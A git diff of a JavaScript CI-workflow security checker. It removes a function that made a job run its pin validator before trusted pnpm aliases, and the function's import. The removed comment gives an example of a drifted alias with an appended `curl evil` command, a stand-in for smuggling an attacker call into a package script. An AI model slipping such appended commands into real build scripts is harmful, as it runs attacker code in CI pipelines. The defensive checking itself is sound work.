@@ -15,7 +15,6 @@
 import assert from "node:assert/strict";
 import { CORE_SCHEMA, load } from "js-yaml";
 import {
-  isCommand,
   parseShellScript,
   runsCommand,
 } from "./check-sentry-suites-in-ci-core-commands.mjs";
@@ -665,58 +664,6 @@ export function contextOwnershipBlockers(workflows, context, owner) {
       `the required \`${context}\` check-run name is published by ${owners.length} job(s) ` +
         `(${owners.join(", ") || "none"}); exactly one — ${owner} — may, or the required context can resolve to a decoy`,
     );
-  }
-  return blockers;
-}
-
-/**
- * Blockers when a job invokes a trusted `pnpm <alias>` before validating that
- * alias's pin. The pins are what make a trusted alias safe: without them a
- * drifted `"sentry:x:test": "node scripts/x.test.mjs && curl evil"` runs its
- * appended command. The meta-check re-checks the pins, but it runs last, so an
- * earlier alias step has already run the appended command. The local gate runs
- * the pin validator first; CI must too, so a drift fails fast before any
- * trusted alias executes.
- *
- * @param {Record<string, any>} workflow
- * @param {string} name the job whose step order is judged
- * @param {string[]} validatorTarget the pin validator command, matched whole
- * @param {string[][]} aliasTargets the trusted `pnpm <alias>` invocations to guard
- */
-export function pinValidationOrderBlockers(
-  workflow,
-  name,
-  validatorTarget,
-  aliasTargets,
-) {
-  const steps = ciJob(workflow, name).steps ?? [];
-  const firstProvenIndex = (target) => {
-    for (let index = 0; index < steps.length; index += 1) {
-      const step = steps[index];
-      if (!isPlainObject(step) || typeof step.run !== "string") continue;
-      if (stepBlockers(step).length > 0) continue;
-      const parsed = parseShellScript(step.run).commands;
-      if (parsed.length === 1 && isCommand(parsed[0], target)) return index;
-    }
-    return -1;
-  };
-
-  const validatorIndex = firstProvenIndex(validatorTarget);
-  if (validatorIndex < 0) {
-    return [
-      `the \`${name}\` job never runs \`${validatorTarget.join(" ")}\` as a whole step command, ` +
-        "so it invokes trusted aliases without validating their pins first",
-    ];
-  }
-  const blockers = [];
-  for (const target of aliasTargets) {
-    const at = firstProvenIndex(target);
-    if (at >= 0 && at < validatorIndex) {
-      blockers.push(
-        `the \`${name}\` job runs \`${target.join(" ")}\` (step ${at}) before the pin validator ` +
-          `(step ${validatorIndex}) — a drifted alias would run its appended command before the pins are checked`,
-      );
-    }
   }
   return blockers;
 }
